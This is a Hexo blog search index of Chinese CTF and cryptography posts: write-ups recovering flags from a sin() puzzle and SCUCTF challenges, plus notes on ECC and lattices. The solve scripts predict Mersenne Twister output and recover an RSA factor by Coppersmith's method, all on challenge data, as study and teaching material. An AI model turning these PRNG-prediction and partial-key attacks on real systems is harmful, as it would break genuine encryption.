<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>lattice-sieve</title>
    <url>/2025/07/24/lattice-sieve/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="f50ad0bee5fb68bda1749676dc34daa3fbb3eb2cf87b68d074429fa4692f5be1">8947c5b41705548aeeade96021e39d89d039d0d53325c8dc80acf00d286e02e4a2d88d9a0d76b8c1b1ea4e1512fb19e9810ae21858cd2ad2e351947b7ff90fd379d71fa6669153b6d861458bb491ea40d8911b2bf1da7dc9142fbf66594fa1beb3840ded0bd37e0430b8e4826596a1194cf0479472708e91680b931a067bb325774c44d7c306894701a86bf5b3ff34bde267cdd70061fcc02e7d01af6e54cc7485f5702eaf1562e5986c75eb012192b0a8f21a56efd7344255c5d366189fb1a0037c690ee8ce3c72bf6053128e15f05b</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">:)</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Cryptoanalysis</category>
      </categories>
      <tags>
        <tag>Lattice</tag>
      </tags>
  </entry>
  <entry>
    <title>做题随记</title>
    <url>/2021/08/11/2021/2021-8-11-%E5%81%9A%E9%A2%98%E9%9A%8F%E8%AE%B0/</url>
    <content><![CDATA[<p>一道浮点位数很高的题目。。</p>
<span id="more"></span>
<h1 id="题目">题目</h1>
<p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line">getcontext().prec = <span class="number">300</span> <span class="comment">#给定精确度为300位</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>():<span class="comment">#生成三百位数的pi,小数点后299位</span></span><br><span class="line">    lasts, t, s, n, na, d, da = <span class="number">0</span>, Decimal(<span class="number">3</span>), <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">24</span></span><br><span class="line">    <span class="keyword">while</span> s != lasts:</span><br><span class="line">        lasts = s</span><br><span class="line">        n, na = n + na, na + <span class="number">8</span></span><br><span class="line">        d, da = d + da, da + <span class="number">32</span></span><br><span class="line">        t = (t * n) / d</span><br><span class="line">        s += t</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sin</span>(<span class="params">x</span>):</span><br><span class="line">    x = Decimal(x) % pi()</span><br><span class="line">    p, factor = <span class="number">0</span>, x</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):<span class="comment">#sinx的泰勒展开</span></span><br><span class="line">        p += factor</span><br><span class="line">        factor *= - (x ** <span class="number">2</span>) / ((<span class="number">2</span> * n + <span class="number">2</span>) * (<span class="number">2</span> * n + <span class="number">3</span>))</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">int</span>.from_bytes(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read(), byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span>(flag &lt; <span class="number">2</span> ** <span class="number">500</span>)</span><br><span class="line"><span class="built_in">print</span>(sin(flag))</span><br><span class="line"><span class="comment"># 0.0244671923862258387777329311304061726117292338164472101939417405767980930400528701470775326212479053586551379126483335032568358369085951301715103743247208229702075426052832758137520953914256336461357368653604728080035204833015365117280775229337006339154544638317547072102876405128588259546493517773166</span></span><br><span class="line"><span class="comment">#实际上这个结果是小数点后301位。。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h1 id="分析">分析</h1>
<p>pi()函数用一个不知道是什么的算法生成了300位（小数点后299位）的Π，sin(x)函数用泰勒展开到第9999轮来计算sinx的结果（反正对300位的结果来说绰绰有余了），然后给出了sin(flag)的结果，是小数点后301位的。之前强网杯的ezmath也是用高精度的浮点数，并且也用了e^x的泰勒展开。</p>
<h1 id="尝试1">尝试1</h1>
<p>既然加密是用sinx的泰勒展开，最初想到用arcsin的展开式去求回去</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">double_factorial</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">__import__</span>(<span class="string">&quot;functools&quot;</span>).reduce(<span class="keyword">lambda</span> x, y: x * y, <span class="built_in">range</span>(n, <span class="number">0</span>, -<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arcsin</span>(<span class="params">x</span>):</span><br><span class="line">    x = Decimal(x) % pi()</span><br><span class="line">    p = x</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">3000</span>):</span><br><span class="line">        f=x</span><br><span class="line">        p+=double_factorial(<span class="number">2</span>*i-<span class="number">1</span>)*(f**(<span class="number">2</span>*i+<span class="number">1</span>))/((<span class="number">2</span>*i+<span class="number">1</span>)*double_factorial(<span class="number">2</span>*i))</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="comment">#0.0244696342317182955380167878859997878648849860507225686198324843880327826384968171815366236530238829279631100698854243103679784022302933149263781311340548493687767140548481414565508236688055024007324091848224931595200235667864586900877342501435623376419548532684797634337279346936509642695145952284863</span></span><br></pre></td></tr></table></figure>
<p>这个结果sin还原回去最后一位和结果不同，猜一位就能得到正确的余数</p>
<h1 id="尝试2">尝试2</h1>
<p>牛顿法也能求根，吴师傅爆了3个小时才爆出来。。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="number">300</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sin</span>(<span class="params">x</span>):</span><br><span class="line">    p, factor = <span class="number">0</span>, x</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):  <span class="comment"># 感觉像泰勒</span></span><br><span class="line">        p += factor</span><br><span class="line">        factor *= - (x ** <span class="number">2</span>) / ((<span class="number">2</span> * n + <span class="number">2</span>) * (<span class="number">2</span> * n + <span class="number">3</span>))</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l = Decimal(<span class="number">0</span>)</span><br><span class="line">r = Decimal(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">des = Decimal(</span><br><span class="line">    <span class="string">&#x27;0.0244671923862258387777329311304061726117292338164472101939417405767980930400528701470775326212479053586551379126&#x27;</span></span><br><span class="line">    <span class="string">&#x27;483335032568358369085951301715103743247208229702075426052832758137520953914256336461357368653604728080035204833015&#x27;</span></span><br><span class="line">    <span class="string">&#x27;365117280775229337006339154544638317547072102876405128588259546493517773166&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    mid2 = (l + r) / <span class="number">2</span></span><br><span class="line">    mid1 = (l + mid2) / <span class="number">2</span></span><br><span class="line">    mid3 = (mid2 + r) / <span class="number">2</span></span><br><span class="line">    p = multiprocessing.Pool(<span class="number">3</span>)</span><br><span class="line">    res = [p.apply_async(sin, args=(mid1,)), p.apply_async(sin, args=(mid2,)), p.apply_async(sin, args=(mid3,))]</span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line">    values = [i.get() <span class="keyword">for</span> i <span class="keyword">in</span> res]</span><br><span class="line">    <span class="keyword">if</span> des &lt; values[<span class="number">0</span>]:</span><br><span class="line">        r = mid1</span><br><span class="line">    <span class="keyword">elif</span> values[<span class="number">0</span>] &lt; des &lt; values[<span class="number">1</span>]:</span><br><span class="line">        l = mid1</span><br><span class="line">        r = mid2</span><br><span class="line">    <span class="keyword">elif</span> values[<span class="number">1</span>] &lt; des &lt; values[<span class="number">2</span>]:</span><br><span class="line">        l = mid2</span><br><span class="line">        r = mid3</span><br><span class="line">    <span class="keyword">elif</span> values[<span class="number">2</span>] &lt; des:</span><br><span class="line">        l = mid3</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;l=&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;r=&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;sin(x)=&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(values[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(l)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"><span class="built_in">print</span>(mid1)</span><br><span class="line"><span class="built_in">print</span>(mid2)</span><br><span class="line"><span class="built_in">print</span>(mid3)</span><br><span class="line"><span class="built_in">print</span>(values[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(values[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(values[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#0.0244696342317182955380167878859997878648849860507225686198324843880327826384968171815366236530238829279631100698854243103679784022302933149263781311340548493687767140548481414565508236688055024007324091848224931595200235667864586900877342501435623376419548532684797634337279346936509642695145952284864</span></span><br></pre></td></tr></table></figure>
<p>这个值用sin反展开回去和结果是一样的，nice，所以现在得到了flag和pi求余的结果了。</p>
<p>接下来是怎么求flag： <span class="math display">\[
∵n\%pi=x
\\∴n=x+m*pi
\]</span>
因为n是整数，所以可以爆破，但是flag的范围太大了，感觉不太现实。</p>
<p>还有一个想法：利用n是整数这一点，x和pi都有小数部分，可以转换成同余方程：
<span class="math display">\[
例如当精度是2的时候，3.14*m+0.02=n位整数\\
∴14*m\%100=98
...类推到300位也是如此
\]</span></p>
<p>但是最后算出来的m大小远超2**500，所以没能做出来。</p>
<p>对于这一题还有个疑问，题目给的结果小数点后有301位的，但是pi小数点后只有299位，这样用原始的pi是不可能出解的（试过将pi也增加到301位，但也没出）。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>decimal</tag>
      </tags>
  </entry>
  <entry>
    <title>2021.end</title>
    <url>/2021/12/31/2021/2021-end/</url>
    <content><![CDATA[<p>​
本来并不打算写年终总结的，但想着还是随便写点吧，所以还是写点吧，既是回顾，也是自省。</p>
<span id="more"></span>
<p>​
总的来说，2021年给我留下的印象并不好，或许是疫情的原因，导致很多事都进行的不顺利。无论是哪个方面，自己都有了很大的变化，或好或坏，都不得而知，总之就是这样了。</p>
<p>​
首先最想说的还得是CTF，毕竟这个搭建这个blog的目的就是记录+学习。从去年新生赛之后很长一段时间只是在看理论，没有去做题实战，导致最初进步的并不快，不过这也与我个人性格有关，高中时学数学的时候便是如此，我往往喜欢去看，欲在思考中穷尽某一原理或某一题，而不喜欢动笔推导计算，被数学老师上课批评过多次23333。当然，我并不觉得这是一件坏事，我非常享受思考的过程，在现在学习的时候也保持着这个习惯。今年4月从MRCTF（被吊打）后，终于知道大赛是怎么一个模式（或者说难度？），算是正式入坑。</p>
<p>​
之后印象比较深的是国赛，就在期中考试前，整个team聚集在一个大教室，非常有氛围感。我记得当天10点要考英语，我们8点去网安大楼集合答题。9点40的时候动身去考英语，结果快到教室的时候发现👴没带听力耳机，赶紧往回跑去买个耳机又回考场，然后英语考试就寄了。那能咋办嘛，考完英语接着回网安楼坐着，无缝衔接国赛，看着大🔥干劲满满，这感觉真是太棒了。</p>
<p>​
暑假到下半年开学后一个月打了很多比赛，觅🐎人斗胆去了两次线下，果然都是坐牢，安洵杯就在成都，AWD模式，化身无情交flag机器。收获就是旅游＋了解线下模式。希望明年能够再学一个方向，线下给队友一点帮助，拿更高的名次（旅游也很棒啊）</p>
<p>​
&lt;-----------------------------我是分割线-------------------------------&gt;</p>
<p>​
现在才发觉以前所知甚少，进入大学后才陆陆续续接触这个社会，才会发现现实是远比文艺作品中更为离谱。在了解到某些事后，会感到如此的震惊、愤懑。有时候经常会钻牛角尖，陷入内耗的状态。这学期选了一门叫《中华文化哲学篇》的课，受益匪浅。截取我的课后感中的一部分：</p>
<p><img src="/images/2021-end/image-20211231164908017.png" alt="image-20211231164908017"></p>
<p><img src="/images/2021-end/image-20211231165016407.png" alt="image-20211231165016407"></p>
<p>最开始上课当然是滑水哈哈哈，但自从放了王德峰老师讲座后便肃然起敬了，只怪自己不能更早意识到这些。离谱的事太多了，要改变更是难于上青天，但还是要做一个有血有肉的人。</p>
<p>​
由于某些原因，上半年借了hxd一笔钱，也正是运气好，下半年拿了国奖。当时评选结果出来的时候，我的第一想法不是喜悦，而是能还钱了，还是凭本事还的，这比奖学金本身更令人高兴。后来和hxd说起来的时候，他还告诉我一开始怕我过的不好，都没打算要我还钱，呜呜，最后还是还了，但还是有被感动到。</p>
<p>​
虽然老早以前就有了目标，但因为理想和现实的冲突，仍旧会迷茫。2021这一年一直在思考，思考很多很多东西，大多无果，索性就不去管它，倒也睡的踏实。可能不是我的问题，而是时间的问题。</p>
<p>​ 最后，2021年的最后一点时间里，终究是被时间背刺了。</p>
<p>​ 我与旧事归于尽,来年依旧迎花开。</p>
]]></content>
      <categories>
        <category>life</category>
      </categories>
  </entry>
  <entry>
    <title>SCUCTF</title>
    <url>/2021/06/04/2021/6.4SCUCTF/</url>
    <content><![CDATA[<p>用以前的的博客测试一下</p>
<span id="more"></span>
<h1 id="贝斯手">贝斯手</h1>
<p>题目暗示了是base家族，先后使用base64 32 long_to_bytes
85和58解密即可获得flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base58</span><br><span class="line"></span><br><span class="line">cipher=<span class="string">&#x27;R1EzVElOQlRHSTNVSU5aVUdRNERNTlpWR0UyREVOS0dHWTJES01aVUlZMkRHTkJSR1JCVE9OUlhHNDNFSU5CWUdSRERNUUpXR00yVElOQlNHUTNUTU1aV0dBMkRPTkJSR1laVE9OSldHQTNES01SV0dZMkRLTVJXSU0zRE9OSlFHVTRETVJCVUdRWlVHTVpVR1VaVE9SQlhJUTJETz09PQ==&#x27;</span></span><br><span class="line"></span><br><span class="line">res=b64decode(cipher)</span><br><span class="line"></span><br><span class="line">res=b32decode(res)</span><br><span class="line"></span><br><span class="line">res=long_to_bytes(<span class="built_in">int</span>(res,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">res=b85decode(res)</span><br><span class="line"></span><br><span class="line">res=base58.b58decode(res)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>flag：scuctf{M4ny_k1nds_0f_13a5e!}</strong></p>
<h1 id="crypto1">crypto1</h1>
<p>预测随机数，有现成的库可以用。要将312个64位数拆成624个32位数，因为32位输出顺序是<strong>abcd</strong>,而64位的顺序是<strong>badc</strong>，所以要反过来取，注意还要填充，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;./test&quot;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">rc=RandCrack()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">312</span>):</span><br><span class="line">    a=<span class="built_in">int</span>(f.readline())</span><br><span class="line">    a=<span class="built_in">bin</span>(a)[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line">    c=<span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+a[:<span class="number">32</span>],<span class="number">2</span>)</span><br><span class="line">    b=<span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+a[<span class="number">32</span>:],<span class="number">2</span>)</span><br><span class="line">    rc.submit(c)</span><br><span class="line">    rc.submit(b)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">res=rc.predict_getrandbits(<span class="number">128</span>)</span><br><span class="line">key1=(long_to_bytes(res))</span><br><span class="line"></span><br><span class="line">res=<span class="built_in">open</span>(<span class="string">&#x27;./out&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">aes = AES.new(key1, AES.MODE_CBC, <span class="string">b&quot;\x00&quot;</span>*<span class="number">16</span>)</span><br><span class="line">flag=aes1.decrypt(res)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>flag：scuctf{af0sd_f8}</strong></p>
<h1 id="crypto2">crypto2</h1>
<p>简单的CopperSmith
p是512位的，x是128位，将x首元变为1，转化后p_是1019位的，未知低128位，那么用CopperSmith
Method即可解决。得到的p再在模n下和2^ex相乘即可得到真正的p。附上脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;sage</span></span><br><span class="line"><span class="string">n = 85016144249518040150910227120120655178858680112497903474795846550337648959184474608344455198424753002209821827392389091448043545937173891641586356377876821641241033232828279439195610943286663032638048058568003136520988549470764306016674503217880123290623177055115638997384030786304744623796469032887028528817</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 83724265903365973936178131138176403586796491037282811488797349096425411605088349291193550728134684573063610685342590513444340298881918101517014943046522979731970278182306111863948764449232289625176702192589838375986050458189860493609407060988207562417247647655585368569618561494059816502622854344519538215287</span></span><br><span class="line"><span class="string">pbar = 4450463823628350893648746241337847373556196959762621885713665365237037340874488165755826348254697529157574566792939002187459776672801308978738078688091668148118673194644809701286264701999481650571431714684293423463355990167658855533422964048092514208406515703766237697665676941598677911363439038209842058509</span></span><br><span class="line"><span class="string">kbits = 128</span></span><br><span class="line"><span class="string">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span></span><br><span class="line"><span class="string">f = x + pbar</span></span><br><span class="line"><span class="string">x0 = f.small_roots(X=2^kbits, beta=0.5)[0]  </span></span><br><span class="line"><span class="string">p = x0 + pbar</span></span><br><span class="line"><span class="string">print(p)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line">leak=<span class="number">1145141920069</span></span><br><span class="line">n=   <span class="number">85016144249518040150910227120120655178858680112497903474795846550337648959184474608344455198424753002209821827392389091448043545937173891641586356377876821641241033232828279439195610943286663032638048058568003136520988549470764306016674503217880123290623177055115638997384030786304744623796469032887028528817</span></span><br><span class="line">c=   <span class="number">83724265903365973936178131138176403586796491037282811488797349096425411605088349291193550728134684573063610685342590513444340298881918101517014943046522979731970278182306111863948764449232289625176702192589838375986050458189860493609407060988207562417247647655585368569618561494059816502622854344519538215287</span></span><br><span class="line">pbar=<span class="number">4450463823628350893648746241337847373556196959762621885713665365237037340874488165755826348254697529157574566792939002187459776672801308978738078688091668148118673194644809701286264701999481650571431714684293423463355990167658855533422964048092514208406515703766237697665676941598677911363439038209842058509</span></span><br><span class="line">ex = <span class="number">384</span></span><br><span class="line">p_=<span class="number">4450463823628350893648746241337847373556196959762621885713665365237037340874488165755826348254697529157574566792939002187459776672801308978738078688091668148118673194644809701286264701999481650571431714684293423463355990167658855533422964048092514208406515703766237697896644308153471350247313227602240058029</span></span><br><span class="line">p=p_*<span class="number">2</span>**ex%n</span><br><span class="line">q=n//p</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(<span class="number">65537</span>,phi)</span><br><span class="line">m=gmpy2.powmod(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p><strong>flag:scuctf{f05fe93d159b398fe25f280d94241261}</strong></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>randcrack</tag>
        <tag>coppersmith</tag>
      </tags>
  </entry>
  <entry>
    <title>ECC</title>
    <url>/2021/08/30/2021/ECC/</url>
    <content><![CDATA[<p>抄点ECC笔记</p>
<span id="more"></span>
<h1 id="ecc">ECC</h1>
<p>定义：ECC 全称为椭圆曲线加密，EllipseCurve
Cryptography，是一种基于椭圆曲线数学的公钥密码。与传统的基于大质数因子分解困难性的加密方法不同，ECC
依赖于解决椭圆曲线离散对数问题的困难性。它的优势主要在于相对于其它方法，它可以在使用较短密钥长度的同时保持相同的密码强度。目前椭圆曲线主要采用的有限域有:</p>
<ol type="1">
<li>以素数为模的整数域 GF(p)，通常在通用处理器上更为有效。</li>
<li>特征为 2 的伽罗华域 GF（2^m），可以设计专门的硬件。</li>
</ol>
<p>（from CTF Wiki）</p>
<h2 id="基础">基础</h2>
<p>定义式：<span class="math display">\[y^2+axy+by=x^3+cx^2+dx+e\]</span>，其中的所有系数都是在某个有限域GF(p)中的元素，p是一个大素数；</p>
<p>最常用的方程为：<span class="math display">\[y^2=x^3+ax+b\]</span>，需要满足条件<span class="math display">\[4a^3+27b^2\;mod\; p \neq 0\]</span></p>
<p>该定义要求曲线是非奇异的，意味着曲线不会自我相交或没有顶点。</p>
<h2 id="群操作">群操作</h2>
<p>假设用加法符号“+”表示它的群操作，事实上，E(Fp)对于运算+构成一个阿贝尔群（交换群，满足逆元存在，封闭性等），存在无穷远点O</p>
<h3 id="逆元">逆元</h3>
<p>定义群元素P的逆元-P，则P+(-P)=O <span class="math display">\[
若P=(x_p,y_p)\;\;\;
则-P=(x_p,p-y_p)
\]</span></p>
<h3 id="数乘">数乘</h3>
<p><span class="math display">\[
定义Q=kP，可以看作k个P相加得到Q \\
若O=tP,则称P的阶是t
\]</span></p>
<h3 id="相异点相加">相异点相加</h3>
<p><span class="math display">\[P(x_1,y_1),Q(x_2,y_2),R(x_3,y_3)\;\;P+Q=R\]</span></p>
<p><img src="/images/ECC/1.png"> <span class="math display">\[
x_3=(\frac{y_2-y_1}{x_2-x_1})^2-x_1-x_2\;mod\;p\\
y_3=\frac{y_2-y_1}{x_2-x_1}(x_1-x_3)-y_1\;mod\;p
\]</span></p>
<h3 id="相同点相加">相同点相加</h3>
<p><img src="/images/ECC/2.png"> <span class="math display">\[
x_3=(\frac{3x_1^2+a}{2y_1})^2-x_1-x_2\;mod\;p\\
y_3=\frac{3x_1^2+a}{2y_1}(x_1-x_3)-y_1\;mod\;p
\]</span></p>
<h2 id="加解密">加解密</h2>
<h3 id="加密">加密</h3>
<p>B向A发送m，其中m已经被编码为椭圆曲线上的点：</p>
<ol type="1">
<li>查询A的公钥<span class="math display">\[E_q(a,b),q,P,G，其中P=kG。k为私钥\]</span>。</li>
<li>在<span class="math display">\[（1，n）\]</span>内选择随机数r（其中n为G的阶数）。</li>
<li>根据A的公钥计算<span class="math display">\[(x_1,y_1)=rG\]</span>。</li>
<li>计算<span class="math display">\[(x_2,y_2)=kP\]</span>。如果为O，则从第二步重新开始。</li>
<li>计算<span class="math display">\[C=m+(x_2,y_2)\]</span>。</li>
<li>将<span class="math display">\[(x_1,y_1)和C\]</span>发送给A</li>
</ol>
<h3 id="解密">解密</h3>
<p><span class="math display">\[
m=C-(x_2,y_2)=C-kP=C-rkG=C-k(x_1,y_1)
\]</span></p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>ECC</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello Hexo</title>
    <url>/2021/08/12/2021/Test/</url>
    <content><![CDATA[<h1 id="hello-hexo">Hello Hexo</h1>
<p>I'm sh1k4ku</p>
<span id="more"></span>
<p>回忆前几个月，自4月进入401后，大大小小也打了不少比赛，大部分的题都是没有解出的，每次自己也会很自责，但似乎又无能为力。</p>
<p>一开始的习惯不好，没有在赛后即使复现，当时想着之后学到一定程度了自然会做了，导致进步缓慢。</p>
<p>不久前才意识到这是大错特错的，所以开了此blog，欲改变自己的懒惰，不要拖队里师傅们的后腿。</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>-hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>lattice_learning</title>
    <url>/2021/07/27/2021/lattice-learning/</url>
    <content><![CDATA[<p>有关格理论的学习记录。</p>
<span id="more"></span>
<h1 id="格的定义">格的定义</h1>
<p>格的定义可以从向量空间引申出来：</p>
<pre><code>一组线性无关的的向量v1，v2，...，vn，它们的线性组合a1v1+a2v2+...+anvn可以
表示一个空间，如果a1,a2，...，an全为整数，则生成了一个格L。则这组向量称为
格的基，向量个数称为格的维数。</code></pre>
<h2 id="基础区域">基础区域</h2>
<p>格的基础区域为即当a1，an，,,,，an为0或1组成的一个区域。格中任意一个向量可以由格的基础区域和唯一格外的一个向量表示。基础区域是格很重要的概念。</p>
<h2 id="格的行列式">格的行列式</h2>
<p>格的行列式就是基础区域的n维体积，记作： <span class="math display">\[
det(L)
\]</span></p>
<h2 id="基的转换">基的转换</h2>
<p>设以v1，v2，...，vn为行向量构成的n阶矩阵为A，某一行列式等于1的n阶矩阵为
U，则矩阵B=UA中的行向量也是格L的一组基。
从<strong>线性变换</strong>的本质来看，线性变换是对空间进行伸缩或者翻转的操作（可惜大多数高校的非数学专业是不会讲这些的，具体可以看b站3b1b的搬运，有关线性代数的本质的介绍，可以给我们很直观的理解），由于U的行列式为1，那么变换后的基础区域体积不变。</p>
<h2 id="格的两大难题">格的两大难题</h2>
<p>均为NP完全问题</p>
<h3 id="最短向量问题">最短向量问题</h3>
<p>简称<strong>SVP</strong>，在格中寻找一个非零向量，使它的范数最小。</p>
<h3 id="最近向量问题">最近向量问题</h3>
<p>简称<strong>CVP</strong>，给定一个不在格中的向量，找到格中一个向量使它最接近给定的向量，即欧几里得范数最小。</p>
<h1 id="重要定理">重要定理</h1>
<h2 id="hadamard不等式">Hadamard不等式</h2>
<p>格L的基础区域为F，对于它任意一个基 <span class="math display">\[
v_1,v_2,...,v_n
\]</span></p>
<p>有： <span class="math display">\[
det(L)=vol(F)\leq||v_1||*||v_2||*...*||v_n||
\]</span> 基向量越接近正交，则上式越接近等式</p>
<h3 id="hadamard比率">Hadamard比率</h3>
<p><span class="math display">\[
H(L)=(\frac{det(L)}{||v_1||*||v_2||*...*||v_n||})^{1/n}
\]</span></p>
<p>当这个值越接近1，则基越接近两两正交</p>
<h2 id="hermite定理">Hermite定理</h2>
<p>所有n维的格L都包含一个非0向量 <span class="math display">\[
v\in L，满足||v||\leq\gamma_ndet(L)^{1/n}
\]</span> 对于给定的维度n <span class="math display">\[
Hermite常量\gamma_n是一个最小值，
\]</span> 它可以使所有n维格L都包含非零向量 <span class="math display">\[
v\in L满足上式。
\]</span> 其中Hertmite常量 <span class="math display">\[
\gamma_n满足：\frac{n}{2Πe}\leq\gamma_n\leq\frac{n}{Πe}
\]</span></p>
<h2 id="minkowski定理">Minkowski定理</h2>
<p><span class="math display">\[
设L\subset R^n是一个n维的格，S\subset
R^n是一个对称凸面集合，其体积满足：
\]</span></p>
<p><span class="math display">\[
vol(S)&gt;2^ndet(L)$
\]</span></p>
<p>如果S满足封闭性，则上式等式成立。</p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Lattice</tag>
      </tags>
  </entry>
  <entry>
    <title>learning with errors</title>
    <url>/2021/11/09/2021/learning-with-errors/</url>
    <content><![CDATA[<p>appearCVP</p>
<span id="more"></span>
<p><span class="math display">\[
v = a*U+s\\
已知v，U求a，s作为噪声影响结果，通常情况下很小\\
如果没有s，则可直接用高斯消元法求a。\\
将U当成格，v是U的线性组合\\
原本v在格上，但加入了噪声使得v有些偏离\\
要做的就是求v的最近向量，解出CVP，再用高斯消元就可求出a
\]</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,V</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_random_U</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_U1</span>():</span><br><span class="line">        A = Matrix(ZZ, n, n)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> 